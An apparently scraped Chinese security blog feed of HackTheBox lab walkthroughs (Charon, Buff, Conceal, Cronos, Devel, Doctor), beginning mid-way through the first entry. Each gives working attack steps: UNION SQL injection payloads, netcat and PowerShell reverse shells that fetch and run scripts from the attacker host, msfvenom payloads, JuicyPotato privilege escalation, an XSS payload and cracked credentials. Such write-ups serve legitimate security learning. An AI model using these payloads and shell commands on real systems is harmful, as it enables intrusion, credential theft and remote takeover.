<td>email=abcd</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com</td>
<td>User not found with that email!</td>
</tr>
<tr>
<td>email=evil@evil.com’</td>
<td>Error in Database!</td>
</tr>
<tr>
<td>email=evil@evil.com”</td>
<td>User not found with that email!</td>
</tr>
</tbody></table>
<p>可以得到，闭合方式为<code>&#39;</code>，继续尝试</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=evil@evil.com’ order by 1–+</td>
<td>User not found with that email!</td>
</tr>
<tr>
<td>email=evil@evil.com’ order by 111111–+</td>
<td>Error in Database!</td>
</tr>
<tr>
<td>email=evil@evil.com’ order by 4–+</td>
<td>User not found with that email!</td>
</tr>
<tr>
<td>email=evil@evil.com’ order by 5–+</td>
<td>Error in Database!</td>
</tr>
</tbody></table>
<p>得到字段数为4</p>
<p>接下来稍微有点坑</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=evil@evil.com’ union select 1,2,3,4–+</td>
<td>Error</td>
</tr>
<tr>
<td>email= union @evil.com</td>
<td>Error</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,2,3,4–+</td>
<td>Incorrect format</td>
</tr>
</tbody></table>
<p>这里过滤了<code>空格union空格 </code>，有点容易忽略，通过大小写可以绕过，之后又会返回<code>Incorrect format</code></p>
<p>这里需要推测一下SQL语句，似乎这条语句应该是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column1,column2,column3,column4 from TABLE_NAME where EMAIL&#x3D;&#39;$INPUT&#39;;</span><br></pre></td></tr></table></figure>

<p>其中任何一个column都有可能是EMAIL，而它是有格式要求的，所以要解决这个问题需要挨个尝试</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=evil@evil.com’ UNiON select ‘abc@abc.com’,2,3,4–+</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,‘abc@abc.com’,3,4–+</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,2,‘abc@abc.com’,4–+</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,2,3,‘abc@abc.com’–+</td>
<td>Email sent to: <a href="mailto:&#97;&#98;&#99;&#64;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#109;">&#97;&#98;&#99;&#64;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#109;</a>=&gt;2</td>
</tr>
</tbody></table>
<p>现在要想办法构造查询的payload，而且要满足条件判断<br>这里可以通过<code>concat()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(&quot;!&quot;,database(),&quot;!&quot;,&quot;abc@abc.com&quot;)--+</span><br><span class="line">输出</span><br><span class="line">Email sent to: !supercms!abc@abc.com&#x3D;&gt;2</span><br></pre></td></tr></table></figure>

<p>这样就得到了数据库名<code>supercms</code></p>
<p><strong>爆表</strong></p>
<p>下面两种语句都可以，from写在里面或者写在外面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(&quot;!&quot;,(select table_name from information_schema.tables WHERE table_schema&#x3D;&#39;supercms&#39; limit 1 offset 0),&quot;!&quot;,&quot;abc@abc.com&quot;)--+</span><br><span class="line">或者</span><br><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(table_name,&quot;evil@evil.com&quot;) FROM information_schema.tables WHERE table_schema&#x3D;&#39;supercms&#39; limit 0,1 --+</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 0),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#x40;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;">&#97;&#x62;&#x63;&#x40;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;</a>“)–+</td>
<td>groups</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 1),”!”,”<a href="mailto:&#x61;&#98;&#x63;&#64;&#x61;&#98;&#99;&#x2e;&#x63;&#x6f;&#109;">&#x61;&#98;&#x63;&#64;&#x61;&#98;&#99;&#x2e;&#x63;&#x6f;&#109;</a>“)–+</td>
<td>license</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 2),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#x40;&#97;&#98;&#x63;&#46;&#99;&#111;&#109;">&#97;&#x62;&#x63;&#x40;&#97;&#98;&#x63;&#46;&#99;&#111;&#109;</a>“)–+</td>
<td>operators</td>
</tr>
</tbody></table>
<p>其中关键的表为<code>operators</code></p>
<p><strong>爆字段</strong></p>
<p>爆表<code>operators</code>的字段</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 0),”!”,”<a href="mailto:&#97;&#x62;&#99;&#64;&#x61;&#x62;&#x63;&#46;&#99;&#111;&#x6d;">&#97;&#x62;&#99;&#64;&#x61;&#x62;&#x63;&#46;&#99;&#111;&#x6d;</a>“)–+</td>
<td>id</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 1),”!”,”<a href="mailto:&#x61;&#98;&#99;&#x40;&#x61;&#x62;&#99;&#x2e;&#x63;&#x6f;&#109;">&#x61;&#98;&#99;&#x40;&#x61;&#x62;&#99;&#x2e;&#x63;&#x6f;&#109;</a>“)–+</td>
<td>__username_</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 2),”!”,”<a href="mailto:&#x61;&#98;&#99;&#64;&#x61;&#98;&#99;&#x2e;&#99;&#111;&#109;">&#x61;&#98;&#99;&#64;&#x61;&#98;&#99;&#x2e;&#99;&#111;&#109;</a>“)–+</td>
<td>__password_</td>
</tr>
</tbody></table>
<p>得到__username_和  __password_</p>
<p><strong>爆数据</strong></p>
<p>换一下payload，from在后面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(__username_,&#39;&#x2F;&#39;, __password_, &quot;!evil@evil.com&quot;) from supercms.operators limit 1 offset 0 --+</span><br></pre></td></tr></table></figure>

<p>这样我们可以得到<code>test1/5f4dcc3b5aa765d61d8327deb882cf99</code>，尝试修改offset后发现数量好像很大，选择使用intruder爆破<code>offset</code></p>
<p><img src="/images/charon/10.png" alt="10"></p>
<p>在很多用户后可以发现</p>
<p><img src="/images/charon/11.png" alt="11"></p>
<p><code>super_cms_adm/0b0689ba94f94533400f4decd87fa260</code></p>
<p>破解md5</p>
<p><img src="/images/charon/12.png" alt="12"></p>
<p><code>super_cms_adm/tamarro</code></p>
<p>之后回到一个上传页面，页面有一个js</p>
<p><img src="/images/charon/13.png" alt="13"></p>
<p>它用来进行前端文件判断，删掉它就好了，另外还有一个CTF点就不提了</p>
<p>通过文件上传，获得shell</p>
<p><img src="/images/charon/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Buff</title>
    <url>/2020/10/23/HTB-Buff/</url>
    <content><![CDATA[<h1 id="Buff"><a href="#Buff" class="headerlink" title="Buff"></a>Buff</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Buff/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现CMS <code>Gym Management</code></p>
<p><img src="/images/Buff/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
<p><img src="/images/Buff/3.png" alt="3"></p>
<p>运行exp</p>
<p><img src="/images/Buff/4.png" alt="4"></p>
<p>看样子是个webshell，查看它的源码，果然是这样</p>
<p><img src="/images/Buff/5.png" alt="5"></p>
<p>通过<code>powershell wget</code>进行文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell wget &quot;http:&#x2F;&#x2F;10.10.16.2&#x2F;winpriv&#x2F;plink32.exe&quot; -outfile &quot;plink.exe&quot;</span><br></pre></td></tr></table></figure>

<p>这台机器有些奇怪的地方</p>
<p>certutil貌似无法使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;10.10.16.2&#x2F;nc.exe</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>

<p>msfvenom的shell运行会被删除，疑似AV？</p>
<p>机器是64位的，webshell应该也是64位的</p>
<p><img src="/images/Buff/8.png" alt="8"></p>
<p>但好像只能用32位的nc获得shell</p>
<p><img src="/images/Buff/6.png" alt="6"></p>
<p>不知道为什么</p>
<p><img src="/images/Buff/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>说实话，有点蛋疼，首先我成功运行了<code>winpeas86</code>，但没有发现有意思的东西</p>
<p>检查端口</p>
<p><img src="/images/Buff/9.png" alt="9"></p>
<p>第一眼看过去好像没什么啥发现</p>
<p>检查user的目录</p>
<p><img src="/images/Buff/10.png" alt="10"></p>
<p>发现了<code>CloudMe_1112.exe</code>，接着我又去枚举进程</p>
<p><img src="/images/Buff/11.png" alt="11"></p>
<p>发现了它确实在运行</p>
<p>搜索公开漏洞，发现了48389.py</p>
<p><img src="/images/Buff/12.png" alt="12"></p>
<p>有点犹豫，因为它似乎运行在8888端口，而我并没有发现它</p>
<p>我是用nc来探测该端口是否处于开放</p>
<p><img src="/images/Buff/16.png" alt="16"></p>
<p>却又发现它确实开放，这次netstat可以显示8888端口，不知道原因</p>
<p>先进行端口转发，这里需要绕过一下，22端口似乎无法使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plink.exe -l root -pw toor -P 53 10.10.16.2 -R 8888:127.0.0.1:8888</span><br></pre></td></tr></table></figure>

<p><img src="/images/Buff/13.png" alt="13"></p>
<p>这是一个BOF漏洞，需要生成一下shellcode，考虑防病毒也许存在，使用之前成功的nc获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.16.2 443 -e cmd&#39; -b &#39;\x00\x0a\x0d&#39; -f python -v payload</span><br></pre></td></tr></table></figure>

<p><img src="/images/Buff/14.png" alt="14"></p>
<p>得到了提权 ，有些困惑为什么<code>netstat</code>没有显示端口</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Conceal</title>
    <url>/2020/06/24/HTB-Conceal/</url>
    <content><![CDATA[<h1 id="Conceal"><a href="#Conceal" class="headerlink" title="Conceal"></a>Conceal</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>第一遍nmap什么都没有扫描出来<br>接着全端口扫描也没扫出来</p>
<p>进行UDP扫描，nmapUDP扫描有点慢，先用masscan扫端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535,U:1-65535 10.10.10.116 --rate&#x3D;1000 -e tun0</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/1.jpg" alt="1"></p>
<p>扫出了端口161，snmp服务</p>
<p>nmap udp扫描非常非常慢，有时候也不准确，建议开着v参数，看端口情况</p>
<p><img src="/images/conceal/5.jpg" alt="5"></p>
<p>但我们也看到了500端口处于开放</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -c public -v 1 10.10.10.116</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/2.jpg" alt="2"></p>
<p>枚举出了ike vpn psk <code>9C8B1A372B1878851BE2C097031B6E43</code><br>尝试破解，得到明文<code>Dudecake1!</code></p>
<p>进一步获取信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmp-check 10.10.10.116</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/3.jpg" alt="3"></p>
<p>这样扫描获取的udp端口非常精准</p>
<p>也许需要通过vpn连接，突破端口过滤</p>
<p>对端口500进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ike-scan -M 10.10.10.116</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/4.jpg" alt="4"></p>
<p>有了这些信息，开始配置vpn文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y strongswan</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/ipsec.secrets</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This file holds shared secrets or RSA private keys for authentication.</span><br><span class="line"></span><br><span class="line"># RSA private key for this host, authenticating it to any other host</span><br><span class="line"># which knows the public part.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">include ipsec.d&#x2F;ipsec.nm-l2tp.secrets</span><br><span class="line"></span><br><span class="line">10.10.10.116 %any : PSK &quot;Dudecake1!&quot;</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/ipsec.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Sample VPN connections</span><br><span class="line">conn Conceal</span><br><span class="line">        authby&#x3D;psk</span><br><span class="line">        auto&#x3D;start</span><br><span class="line">        keyexchange&#x3D;ikev1</span><br><span class="line">        ike&#x3D;3des-sha1-modp1024</span><br><span class="line">        esp&#x3D;3des-sha1</span><br><span class="line">        fragmentation &#x3D; yes</span><br><span class="line">        left&#x3D;10.10.16.98</span><br><span class="line">        right&#x3D;10.10.10.116</span><br><span class="line">        type&#x3D;transport</span><br><span class="line">        rightprotoport&#x3D;tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authby 认证方式</span><br><span class="line">auto   ipsec启动时，自动执行的参数</span><br><span class="line">keyexchange 根据扫描结果(IKE CGA version 1)</span><br><span class="line">ike	    扫描结果Enc&#x3D;3DES Hash&#x3D;SHA1 Group&#x3D;2:modp1024</span><br><span class="line">esp	    扫描结果Enc&#x3D;3DES Hash&#x3D;SHA1</span><br><span class="line">fragmentation &#x3D; yes  扫描结果(IKE Fragmentation)</span><br><span class="line">fragmentaion&#x3D;yes   </span><br><span class="line">left    左侧设备，自己</span><br><span class="line">right	右侧设备，对方</span><br><span class="line">type	连接类型，transport，表示 host-to-host传输模式	</span><br><span class="line">rightprotoport 指定传输协议</span><br></pre></td></tr></table></figure>

<p>之后执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipsec stop		&#x2F;&#x2F;重启</span><br><span class="line">ipsec start --nofork</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/6.jpg" alt="6"></p>
<p>看到这个说明没报错，就连接成功了</p>
<p>现在我们可以对端口进行扫描<br>注意这里不能用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 10.10.10.16</span><br></pre></td></tr></table></figure>

<p>默认使用syn扫描，这样无法通过vpn进行扫描，需要使用tcp连接扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/7.jpg" alt="7"></p>
<p>这一次扫描端口开了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>ftp允许匿名访问，登录进去</p>
<p><img src="/images/conceal/8.jpg" alt="8"></p>
<p>里面没有东西，我们先上传的文件过去</p>
<p>smb没有访客登录，没有有价值的信息</p>
<p>最后访问80，主页没有发现，运行目录扫描，发现目录<code>/upload</code></p>
<p><img src="/images/conceal/9.jpg" alt="9"></p>
<p>发现我们之前上传的文件，那利用思路就很明显了<br>不过在我之后刷新了一下页面，发现刚刚上传的文件消失了，看来上传的文件有一定的生命周期</p>
<p>msfvenom做了两个木马传上去，全都无法执行<br>换了个webshell，就可以了，<a href="https://github.com/tennc/webshell">链接</a></p>
<p><img src="/images/conceal/10.jpg" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先利用webshell获取powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/11.jpg" alt="11"></p>
<p>在机器上发现<code>SeImpersonatePrivilege</code>启用，准备使用<code>juicypotato</code></p>
<p>接下来传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLSID.list</span><br><span class="line">JuicyPotato.exe</span><br><span class="line">test_clsid.bat</span><br><span class="line">evil.bat</span><br></pre></td></tr></table></figure>

<p>eveil.bat内容位反弹powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>先运行test_clsid.bat扫描可利用的clsid</p>
<p><img src="/images/conceal/12.jpg" alt="12"></p>
<p>之后就可以弹shell回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\USers\Destitute\Music\JuicyPotato.exe -t * -p C:\USers\Destitute\Music\evil.bat -l 2500 -c &#39;&#123;e60687f7-01a1-40aa-86ac-db1cbf673334&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Cronos</title>
    <url>/2020/06/12/HTB-Cronos/</url>
    <content><![CDATA[<h1 id="Cronos"><a href="#Cronos" class="headerlink" title="Cronos"></a>Cronos</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Cronos/1.jpg" alt="1"></p>
<p>发现目标存在ssh，dns，http三个服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先访问目标ip</p>
<p><img src="/images/Cronos/2.jpg" alt="2"></p>
<p>出现apache默认页面<br>之后进行了目录扫描，但一无所获，看来是要要配置host</p>
<p><img src="/images/Cronos/3.jpg" alt="3"></p>
<p>配置完hosts后页面变成了这样</p>
<p><img src="/images/Cronos/4.jpg" alt="4"></p>
<p>不过当前页面的链接已经不在cronos.htb，运行目录扫描也没发现有价值的信息</p>
<h4 id="dns区域传输"><a href="#dns区域传输" class="headerlink" title="dns区域传输"></a>dns区域传输</h4><p>我想尝试进行子域名枚举，首先尝试dns区域传输，如果没有发现再尝试layer之类的子域名扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.13 cronos.htb axfr</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/5.jpg" alt="5"></p>
<p>运气很好，成功进行了区域传输</p>
<p>接着把子域名添加到hosts里进行dns解析</p>
<p><img src="/images/Cronos/6.jpg" alt="6"></p>
<p>之后访问子域名</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="/images/Cronos/7.jpg" alt="7"></p>
<p>发现了一个登录页面，尝试sql注入<br>payload:<code>1&#39; or 1=1#</code></p>
<p><img src="/images/Cronos/8.jpg" alt="8"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>这页面一看就是可能存在命令执行</p>
<p>我们可以尝试payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/9.jpg" alt="9"></p>
<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8;sleep 5s</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/10.jpg" alt="10"></p>
<p>观察时间</p>
<p><img src="/images/Cronos/11.jpg" alt="11"></p>
<p>可以发现，命令是执行了，所以现在我们只要执行反弹shell指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 10.10.16.123 4444 1&gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/12.jpg" alt="12"></p>
<p>成功getshell</p>
<p>升级shell为全交互式shell</p>
<p><img src="/images/Cronos/13.jpg" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行提权脚本</p>
<p><img src="/images/Cronos/15.jpg" alt="15"></p>
<p><img src="/images/Cronos/14.jpg" alt="14"></p>
<p>在系统中发现了以root运行的计划任务<br>并且我们对该文件具有w权限</p>
<p>用我们的php shell替换artisan即可</p>
<p><img src="/images/Cronos/16.jpg" alt="16"></p>
<p>成果获取root</p>
<p>内核提权<code>44298.c</code>也是可以的</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Devel</title>
    <url>/2020/06/06/HTB-Devel/</url>
    <content><![CDATA[<h1 id="Devel"><a href="#Devel" class="headerlink" title="Devel"></a>Devel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Devel/1.jpg" alt="1"></p>
<p>扫出ftp和http两个服务，其中ftp允许匿名登陆</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问http页面</p>
<p><img src="/images/Devel/2.jpg" alt="2"></p>
<p>发现了IIS的欢迎页面，不过在这其中我发现了一些细节</p>
<p>图片名为<code>welcome.png</code>，该页面链接为<code>iisstart.htm</code>，而且存在目录</p>
<p><img src="/images/Devel/3.jpg" alt="3"></p>
<p>这和ftp匿名登录分享的文件一样</p>
<p><img src="/images/Devel/4.jpg" alt="4"></p>
<p>所以可以初步断定，web服务和ftp服务工作在同一个目录</p>
<p>之后，我们可以尝试文件上传</p>
<p><img src="/images/Devel/5.jpg" alt="5"></p>
<p>文件上传成功</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="put-getshell"><a href="#put-getshell" class="headerlink" title="put getshell"></a>put getshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;10.10.16.132 LPORT&#x3D;4444 -f aspx -o &#x2F;root&#x2F;Desktop&#x2F;shell.aspx</span><br><span class="line">ftp&gt; put shell.aspx</span><br></pre></td></tr></table></figure>

<p>之后<code>multi/handler</code>监听→访问<code>shell.aspx</code>→getshell</p>
<p><img src="/images/Devel/6.jpg" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Devel/7.jpg" alt="7"></p>
<p>hotfix(s)没有任何补丁</p>
<h3 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h3><p>修改<code>Invoke-PowerShellTcp.ps1</code>，末尾添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.132 -Port 5555</span><br></pre></td></tr></table></figure>

<p>kali监听5555端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>

<p>cmd shell执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.132&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p>成功获取powershell会话</p>
<p><img src="/images/Devel/10.jpg" alt="10"></p>
<p>执行sherlock提权脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.132&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devel/11.jpg" alt="11"></p>
<p>发现可以使用MS15-051</p>
<p>进行文件传输</p>
<p>可以使用powershell传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.16.132&#x2F;nc.exe&#39;,&#39;c:\Windows\Temp\nc.exe&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>也可以使用smb传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali</span><br><span class="line">smbserver.py -smb2support a &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">windows</span><br><span class="line">copy \\10.10.16.132\a\ms15-051.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devel/12.jpg" alt="12"></p>
<p>提权脚本运行成功，配合运行nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ms15-051 &quot;c:\Windows\Temp\nc.exe 10.10.16.132 6666 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devel/13.jpg" alt="13"></p>
<h3 id="meterpreter提权"><a href="#meterpreter提权" class="headerlink" title="meterpreter提权"></a>meterpreter提权</h3><p>multi/recon/local_exploit_suggester</p>
<p><img src="/images/Devel/8.jpg" alt="8"></p>
<p>使用提权</p>
<p><img src="/images/Devel/9.jpg" alt="9"></p>
<p>期间出现了一次崩溃，再尝试一次就好了</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Doctor</title>
    <url>/2020/10/10/HTB-Doctor/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/doctor/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>手动检查80端口</p>
<p><img src="/images/doctor/2.png" alt="2"></p>
<p>发现了存在域名，添加到<code>hosts</code>里，再次访问</p>
<p><img src="/images/doctor/3.png" alt="3"></p>
<p>发现了一个登录页面</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>找不到登录凭据，搜索不到CMS版本，进行一些常规枚举也没什么收获</p>
<p>注册一个账号登进去看看</p>
<p><img src="/images/doctor/4.png" alt="4"></p>
<p>注册登录成功，不过账号只保留20分钟</p>
<p>发现留言板功能</p>
<p><img src="/images/doctor/5.png" alt="5"></p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>源代码中发现了一个测试页面</p>
<p><img src="/images/doctor/6.png" alt="6"></p>
<p>我们在留言随便输入一些数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Title:</span><br><span class="line">abc</span><br><span class="line">Content:</span><br><span class="line">cba</span><br></pre></td></tr></table></figure>

<p>在<code>http://doctors.htb/archive</code>中，页面为空，但是源代码中发现了一些信息</p>
<p><img src="/images/doctor/7.png" alt="7"></p>
<p>看来Title这里有回显，首先可以想到xss，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;title&gt;&lt;&#x2F;item&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

